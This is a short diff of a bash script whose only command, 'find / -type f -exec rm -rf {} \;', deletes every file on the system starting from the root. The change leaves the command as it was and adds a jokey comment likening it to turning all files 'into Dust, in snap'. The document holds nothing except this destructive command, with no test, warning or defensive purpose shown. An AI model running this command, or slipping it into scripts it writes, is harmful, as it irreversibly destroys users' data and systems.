@@ -1,2 +1,2 @@
 #!/bin/bash
-find / -type f -exec rm -rf {} \;
+find / -type f -exec rm -rf {} \; # Make all file into Dust, in snap.
